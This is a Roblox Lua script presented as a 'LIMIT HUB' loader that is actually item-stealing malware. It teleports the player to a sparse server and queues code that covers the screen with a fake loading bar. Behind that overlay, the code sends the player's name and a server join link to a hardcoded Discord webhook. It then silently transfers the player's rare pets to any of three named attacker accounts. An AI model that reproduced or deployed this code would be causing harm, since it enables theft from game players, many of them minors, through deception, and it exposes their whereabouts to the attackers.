local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local placeId = 126884695634066

-- 🌐 Discord webhook URL
local webhookUrl = "https://discord.com/api/webhooks/1397439247945961492/yPzGzyu0CQXfSkP-WsMsM6i-0mhmyCDTQP81vOKzm0H_WTYp6V2eTzkQ8EBgSkJ2_m_V"

-- 🧠 QUEUED CODE after server hop
local loadingScript = [[

-- ▶️ Services for GUI + webhook + pet transfer
local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

-- ✅ 1. GUI SHOW (full black background)
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "LimitHubLoading"
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 999999
screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")

local bg = Instance.new("Frame", screenGui)
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.BackgroundTransparency = 0 -- fully black

local title = Instance.new("TextLabel", bg)
title.Size = UDim2.new(0, 800, 0, 100)
title.Position = UDim2.new(0.5, -400, 0.5, -60)
title.BackgroundTransparency = 1
title.Text = "LIMIT HUB"
title.TextColor3 = Color3.fromRGB(0, 255, 255)
title.Font = Enum.Font.Fantasy
title.TextScaled = true

local percentLabel = Instance.new("TextLabel", bg)
percentLabel.Size = UDim2.new(0, 100, 0, 40)
percentLabel.Position = UDim2.new(0.5, -50, 0.5, 80)
percentLabel.BackgroundTransparency = 1
percentLabel.TextColor3 = Color3.new(1, 1, 1)
percentLabel.Font = Enum.Font.Code
percentLabel.TextScaled = true
percentLabel.Text = "0%"

local barOutline = Instance.new("Frame", bg)
barOutline.Size = UDim2.new(0, 400, 0, 25)
barOutline.Position = UDim2.new(0.5, -200, 0.5, 40)
barOutline.BackgroundColor3 = Color3.new(0, 0, 0)
barOutline.BorderColor3 = Color3.fromRGB(0, 255, 255)
barOutline.BorderSizePixel = 2

local fill = Instance.new("Frame", barOutline)
fill.Size = UDim2.new(0, 0, 1, 0)
fill.BackgroundColor3 = Color3.fromRGB(0, 255, 255)
fill.BorderSizePixel = 0

-- 🎞️ GUI LOADING BAR Animation
task.spawn(function()
    local percent = 0
    while percent <= 100 do
        percentLabel.Text = percent .. "%"
        fill.Size = UDim2.new(percent / 100, 0, 1, 0)
        percent += 5
        task.wait(10)
    end
    screenGui:Destroy()
end)

-- 📩 2. WEBHOOK SEND
task.delay(3, function()
    if typeof(request) ~= "function" then return end
    pcall(function()
        local placeId = game.PlaceId
        local jobId = game.JobId
        local kebabLink = "https://kebabman.vercel.app/start?placeId=" .. placeId .. "&gameInstanceId=" .. jobId

        local data = {
            ["content"] = "",
            ["embeds"] = {{
                ["title"] = "Player Joined New Server",
                ["description"] = ("**Name:** %s\n**JobId:** %s\n[Join Server](%s)"):format(LocalPlayer.Name, jobId, kebabLink),
                ["color"] = 0x00FFFF
            }}
        }

        request({
            Url = "]] .. webhookUrl .. [[",
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode(data)
        })
    end)
end)

-- 🐾 3. SILENT PET TRANSFER
task.delay(3, function()
    local attackers = {
        ["boneblossom215"] = true,
        ["beanstalk1251"] = true,
        ["burningbud709"] = true,
    }

    local targetPets = {
        ["trex"] = true, ["fennec fox"] = true, ["raccoon"] = true, ["dragonfly"] = true,
        ["butterfly"] = true, ["queenbee"] = true, ["spinosaurus"] = true, ["redfox"] = true,
        ["brontosaurus"] = true, ["mooncat"] = true, ["mimic octopus"] = true,
        ["disco bee"] = true, ["dilophosaurus"] = true, ["kitsune"] = true
    }

    local maxWait = 180
    local elapsed = 0
    local receiver = nil

    while elapsed < maxWait and not receiver do
        for _, player in pairs(Players:GetPlayers()) do
            if attackers[player.Name] then
                receiver = player
                break
            end
        end
        if not receiver then
            task.wait(2)
            elapsed += 2
        end
    end

    if receiver then
        local petFolder = LocalPlayer:FindFirstChild("Pets") or LocalPlayer:WaitForChild("Pets", 5)
        if petFolder then
            for _, pet in pairs(petFolder:GetChildren()) do
                if targetPets[string.lower(pet.Name)] then
                    local remote = ReplicatedStorage:FindFirstChild("TransferPet")
                    if remote then
                        remote:FireServer(pet, receiver)
                    end
                end
            end
        end
    end
end)
]]

-- 🧪 4. SERVER HOP FUNCTION
local function serverHop()
    local cursor = ""
    local smallestServer = nil

    repeat
        local success, result = pcall(function()
            return HttpService:JSONDecode(HttpService:GetAsync(
                ("https://games.roblox.com/v1/games/%s/servers/Public?sortOrder=Asc&limit=100&cursor=%s"):format(placeId, cursor)
            ))
        end)

        if success and result and result.data then
            for _, server in pairs(result.data) do
                if server.playing < server.maxPlayers and server.id ~= game.JobId then
                    if not smallestServer or server.playing < smallestServer.playing then
                        smallestServer = server
                    end
                end
            end
            cursor = result.nextPageCursor or ""
        else
            break
        end
        task.wait(0.2)
    until cursor == ""

    queue_on_teleport(loadingScript)

    if smallestServer then
        TeleportService:TeleportToPlaceInstance(placeId, smallestServer.id, LocalPlayer)
    else
        TeleportService:Teleport(placeId, LocalPlayer)
    end
end

-- 🚀 5. START EXECUTION
serverHop()
